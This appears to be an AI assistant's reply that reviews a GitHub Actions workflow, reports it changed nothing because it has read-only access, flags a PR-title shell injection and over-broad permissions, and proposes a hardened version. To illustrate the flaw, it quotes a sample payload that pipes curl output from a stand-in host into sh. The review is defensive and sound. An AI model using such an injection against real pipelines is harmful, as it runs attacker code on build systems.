I haven't changed anything. I can only read files in this session, and the workflow has no build or test step to attach an upload to.

**Current state of `.github/workflows/deploy.yml`:**

```yaml
on:
  pull_request:
permissions: write-all
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Title is ${{ github.event.pull_request.title }}"
```

There are no test or build steps, so "after the tests pass" has nothing to follow, and there's no build output to upload. The repo has Python tests (`tests/test_balance.py`) and Go code (`cmd/parser.go`), but I didn't find any build setup for either (no `pyproject.toml`, `go.mod` or similar). So I can't tell what the "build artifact" should be.

**Two security problems in the existing file** (worth fixing before adding anything):
- **Line 14 lets someone inject a shell command.** The PR title is inserted straight into the shell script, so a PR titled something like `"; curl evil | sh; echo "` runs as code. Pass it through an environment variable instead.
- **Line 7 gives the workflow write access to everything (`permissions: write-all`)** on a `pull_request` trigger. Uploading an artifact only needs `contents: read`.

**Suggested version.** The test and build commands are placeholders until you tell me the real ones:

```yaml
---
name: deploy

on:
  pull_request:

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false

      - name: Show PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Run tests
        run: |
          python -m pip install pytest
          python -m pytest tests/

      - name: Build
        run: echo "TODO: real build command producing dist/"   # placeholder

      - name: Upload build artifact
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: build-${{ github.sha }}
          path: dist/
          if-no-files-found: error
          retention-days: 7
```

The upload only runs if the earlier steps succeed. Because of `if-no-files-found: error`, it fails if the build produced nothing, so it can't quietly upload an empty artifact. For stricter supply-chain safety, pin the actions to full commit SHAs instead of `@v4` / `@v5`.

To finish this, I need:
1. **What the artifact is:** the Go binary from `cmd/`, a Python package, the Docker image, or something else? Tell me the build command and output path.
2. **Edit access:** if you grant it, I'll apply the change directly. Otherwise you can paste the YAML above once the placeholders are filled in.
